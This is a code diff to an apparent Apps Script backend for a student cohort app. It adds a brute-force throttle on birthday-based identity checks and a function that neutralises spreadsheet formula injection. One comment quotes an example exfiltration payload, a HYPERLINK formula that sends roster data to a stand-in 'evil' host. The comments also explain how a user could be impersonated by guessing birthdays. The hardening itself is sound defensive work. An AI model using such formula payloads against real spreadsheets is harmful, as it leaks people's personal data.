@@ -71,9 +71,11 @@
 //
 // No response caching:
 //   identify is called ~once per device per cohort, and prompts
-//   needs to reflect Director edits immediately, so neither uses
-//   CacheService. Direct sheet reads are negligible at cohort
-//   scale.
+//   needs to reflect Director edits immediately, so no RESPONSE is
+//   cached. Direct sheet reads are negligible at cohort scale.
+//   (CacheService IS used, but only for the identify brute-force
+//   throttle — a per-CWID failed-attempt counter, not cached data;
+//   see IDENTIFY_MAX_FAILS.)
 //
 // Re-deploy after editing this file:
 //   Apps Script editor → Deploy → Manage deployments → pencil icon
@@ -151,6 +153,23 @@ const CURATED_FIELDS = [
 ];
 
 const VALID_ROLES = ["student", "staff", "faculty"];
+
+// Brute-force throttle on identity checks. The cohort token is
+// shared with the whole cohort, so it is not a secret within it;
+// once a token-holder is past the cohort gate, verifyUserIdentity
+// is the only thing standing between them and impersonating a
+// classmate (guess a known CWID's birthday — at most 366 tries) or
+// a staff member (which would unlock admin_responses). Count failed
+// attempts per CWID in CacheService; once a CWID is over the cap,
+// return no_match without reading the sheet until the window
+// elapses. A successful identify clears the counter, so a student
+// who fat-fingers their birthday once isn't penalized. Per-CWID
+// (not global) so one attacker can't lock the whole cohort out; the
+// only DoS is locking out the one CWID being attacked, and identify
+// runs ~once per device per cohort so that window of harm is tiny.
+const IDENTIFY_MAX_FAILS = 10;
+const IDENTIFY_FAIL_WINDOW_SEC = 600; // 10 minutes
+const IDENTIFY_FAIL_SLEEP_MS = 700;   // per-failure delay; raises brute-force cost at negligible UX cost
 
 // =========================================================
 // Web App entry points
@@ -257,17 +276,38 @@ function verifyUserIdentity(params) {
   const expectedBirthday = parseBirthdayMD(birthdayRaw);
   if (!expectedBirthday) return { error: "bad_request" };
 
+  // Throttle: once this CWID is over the failure cap for the
+  // window, short-circuit to no_match without touching the sheet —
+  // indistinguishable from a wrong guess, and it saves a sheet read.
+  const cache = CacheService.getScriptCache();
+  const failKey = "idfail_" + cwid;
+  const fails = Number(cache.get(failKey) || 0);
+  if (fails >= IDENTIFY_MAX_FAILS) {
+    Utilities.sleep(IDENTIFY_FAIL_SLEEP_MS);
+    return { error: "no_match" };
+  }
+
+  // Record a failed attempt against this CWID and return no_match.
+  // The small sleep slows blind enumeration even before the cap.
+  const recordFail = function () {
+    cache.put(failKey, String(fails + 1), IDENTIFY_FAIL_WINDOW_SEC);
+    Utilities.sleep(IDENTIFY_FAIL_SLEEP_MS);
+    return { error: "no_match" };
+  };
+
   const row = findRosterRow(cwid);
-  if (!row) return { error: "no_match" };
+  if (!row) return recordFail();
 
   const rowBirthday = parseBirthdayMD(String(row.birthday || ""));
-  if (!rowBirthday || rowBirthday !== expectedBirthday) return { error: "no_match" };
+  if (!rowBirthday || rowBirthday !== expectedBirthday) return recordFail();
 
   // Treat blank program_status as active. Reject non-active rows
   // so a withdrawn or completed student can't sign in mid-cohort.
   const status = String(row.program_status || "active").trim().toLowerCase();
-  if (status !== "active") return { error: "no_match" };
+  if (status !== "active") return recordFail();
 
+  // Success — clear the failure counter for this CWID.
+  cache.remove(failKey);
   return { user: row };
 }
 
@@ -890,7 +930,7 @@ function appendPlaceRow(place) {
   const rowArr = new Array(headers.length).fill("");
   for (const key in place) {
     const idx = headers.indexOf(key);
-    if (idx >= 0) rowArr[idx] = place[key];
+    if (idx >= 0) rowArr[idx] = sheetSafe(place[key]);
   }
   sheet.getRange(sheet.getLastRow() + 1, 1, 1, headers.length).setValues([rowArr]);
 }
@@ -994,12 +1034,15 @@ function handleVetPlace(body) {
     }
     if (rowNum < 0) return jsonResponse({ error: "not_found" });
 
+    // status ("approved"/"rejected") and creditVal ("TRUE"/"FALSE")
+    // are from fixed sets; vetted_by is a roster name (Director-
+    // controlled) — sheetSafe'd anyway for a uniform write policy.
     sheet.getRange(rowNum, colIdx.status + 1).setValue(status);
     if (hasCredit && colIdx.show_credit != null) {
       sheet.getRange(rowNum, colIdx.show_credit + 1).setValue(creditVal);
     }
     if (colIdx.vetted_by != null) {
-      sheet.getRange(rowNum, colIdx.vetted_by + 1).setValue(vettedBy);
+      sheet.getRange(rowNum, colIdx.vetted_by + 1).setValue(sheetSafe(vettedBy));
     }
   } finally {
     lock.releaseLock();
@@ -1208,7 +1251,10 @@ function upsertResponses(cwid, promptId, fieldValues, submittedAt) {
 
   const appends = [];
   for (const fid in fieldValues) {
-    const v = fieldValues[fid];
+    // sheetSafe: the value is free-form student input (short_text /
+    // long_text especially) — neutralize formula leads before it
+    // lands in a cell the Director will open.
+    const v = sheetSafe(fieldValues[fid]);
     if (existingByField[fid]) {
       const rowNum = existingByField[fid];
       sheet.getRange(rowNum, colIdx.value + 1).setValue(v);
@@ -1347,6 +1393,24 @@ function parseBirthdayMD(raw) {
 function pad2(n) {
   const s = String(n);
   return s.length < 2 ? ("0" + s) : s;
+}
+
+// Neutralize spreadsheet formula injection before writing any
+// user-sourced text into a cell. A value beginning with = + - @
+// (or a tab/CR that Sheets can treat as a formula lead) is rendered
+// as a live formula the moment the Director opens this spreadsheet —
+// and this is the PII spreadsheet, so a payload like
+// =HYPERLINK("https://evil/?x="&Roster!B2,"x") could exfiltrate a
+// classmate's data in the Director's authenticated session. Prefix
+// a single quote, which Sheets treats as "force text" and hides in
+// normal display, so the value shows exactly as typed but never
+// evaluates. Applied at every setValue/setValues sink that can carry
+// student input (place fields, prompt responses). Non-string and
+// already-safe values pass through unchanged.
+function sheetSafe(v) {
+  if (v == null) return "";
+  const s = String(v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
 }
 
 // Mirrors App.jsx parseBoolean. TRUE/yes/y/1/x/✓/sí/si all read
